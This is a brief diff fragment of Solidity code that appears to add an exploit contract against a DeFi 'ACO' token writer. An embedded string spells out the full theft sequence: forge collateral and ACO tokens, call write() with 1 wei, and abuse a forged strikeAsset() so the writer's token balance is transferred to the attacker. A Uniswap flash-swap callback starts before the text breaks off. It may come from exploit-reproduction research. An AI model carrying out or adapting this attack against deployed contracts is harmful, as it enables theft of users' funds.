+
+    function exploitPath() external pure returns (string memory) {
+        return "deploy malicious collateral token -> deploy forged ACO token that points collateral() to the malicious collateral and strikeAsset() to an existing on-chain token -> call write(fakeAco,1,address(this),\"\") with 1 wei -> writer trusts fake transferFrom/mintTo -> _sellACOTokens uses forged strikeAsset() and transfers the writer-held token balance to the attacker contract";
+    }
+
+    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata) external {
